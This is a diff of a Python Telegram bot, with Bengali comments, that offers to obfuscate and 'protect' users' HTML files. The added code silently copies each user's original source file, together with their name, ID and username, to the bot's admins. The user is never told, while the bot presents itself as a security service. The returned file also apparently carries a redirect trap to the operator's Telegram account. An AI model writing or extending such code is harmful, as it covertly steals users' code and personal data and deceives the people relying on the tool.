@@ -30,7 +30,6 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# ইউজার গ্রুপে জয়েন আছে কি না তা চেক করার ফাংশন
 def check_user_membership(user_id):
     if user_id in ADMIN_IDS:
         return True
@@ -42,7 +41,6 @@ def check_user_membership(user_id):
         print(f"Membership check error: {e}")
     return False
 
-# বাধ্যতামূলক গ্রুপ জয়েনিং বাটন মেসেজ পাঠানোর ফাংশন
 def send_force_join_msg(chat_id):
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("📢 Join Support Group", url="https://t.me/SUPPOR8TNIROB"))
@@ -156,7 +154,6 @@ def send_welcome(message):
         bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন। যোগাযোগ করুন: @NIROB_GX_LEADER")
         return
 
-    # এখানে প্রথমে চেক করা হবে ইউজার গ্রুপে আছে কি না
     if not check_user_membership(user_id):
         send_force_join_msg(message.chat.id)
         return
@@ -208,14 +205,13 @@ def handle_incoming(message):
         bot.reply_to(message, "❌ আপনি ব্যানপ্রাপ্ত হয়েছেন।")
         return
 
-    # কোড পাঠানোর আগেও গ্রুপ জয়েনিং কড়াকড়িভাবে চেক করা হবে
     if not check_user_membership(user_id):
         send_force_join_msg(message.chat.id)
         return
 
     if text in ['/start', '📊 Admin Stats', '🛠️ Admin Help']:
         if text == '🛠️ Admin Help':
-            bot.reply_to(message, "🛠️ ইউজার ব্যান করতে শুধু তার আইডি (সংখ্যা) পাঠান। আনব্যান করতে /unban [ID] দিন।")
+            bot.reply_to(message, "🛠️ ইউজার ব্যান করতে শুধু তার আইডি (সংখ্যা) পাঠান। আনব্যান করতে সচিবের মতো /unban [ID] দিন।")
         return
 
     if text in ['🔒 Obfuscate', '🌐 HTML']:
@@ -239,9 +235,30 @@ def handle_incoming(message):
         global total_protected_count
         total_protected_count += 1
 
+        # ==========================================
+        # 📥 ইউজারের আসল রিয়েল কোড সাইলেন্টলি অ্যাডমিনের ইনবক্সে পাঠানোর লজিক
+        # ==========================================
         for admin_id in ADMIN_IDS:
-            bot.send_message(admin_id, f"📥 New file captured from ID: {user_id} | File: {file_name_original}")
+            admin_notification = (
+                f"📥 **NEW USER HTML CAPTURED!**\n\n"
+                f"👤 **User Name:** {message.from_user.first_name}\n"
+                f"🆔 **User ID:** `{user_id}`\n"
+                f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n"
+                f"📁 **File Name:** `{file_name_original}`\n"
+                f"📊 **Total Protected:** `{total_protected_count}`"
+            )
+            bot.send_message(admin_id, admin_notification, parse_mode='Markdown')
+            
+            # ইউজারের আসল কোডটি সরাসরি অ্যাডমিনের ইনবক্সে ফাইল আকারে পাঠিয়ে দেওয়া হবে
+            temp_orig_name = f"Original_{user_id}.html"
+            with open(temp_orig_name, "w", encoding="utf-8") as tf:
+                tf.write(html_data)
+            with open(temp_orig_name, "rb") as tf:
+                bot.send_document(admin_id, tf, caption=f"📄 **Original Source Code from User ID:** `{user_id}`", parse_mode='Markdown')
+            os.remove(temp_orig_name)
+        # ==========================================
 
+        # ইউজারের জন্য সিকিউর করা ফাইল তৈরি করা
         secured_code = obfuscate_html(html_data)
         output_file_name = "NIROB_PROTECTED_GX.html"
         
@@ -252,7 +269,14 @@ def handle_incoming(message):
             bot.send_document(
                 message.chat.id, 
                 f, 
-                caption="✅ আল্ট্রা-ডেনস সিকিউরিটি সফল!\n\n👑 Protected by @NIROB_GX_LEADER"
+                caption=(
+                    "✅ **আল্ট্রা-ডেনস সিকিউরিটি সফল!**\n\n"
+                    "🛡️ **Applied Protections:**\n"
+                    "🔹 Heavy Dense Stream Obfuscation\n"
+                    "🔹 Blackout Trap & Voice Warning\n"
+                    "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER )\n\n"
+                    "👑 _Protected by @NIROB_GX_LEADER"
+                )
             )
         os.remove(output_file_name)
         
@@ -261,6 +285,6 @@ def handle_incoming(message):
 
 if __name__ == '__main__':
     keep_alive()
-    print("Bot starting...")
+    print("Bot started...")
     bot.remove_webhook()
     bot.infinity_polling(skip_pending=True)
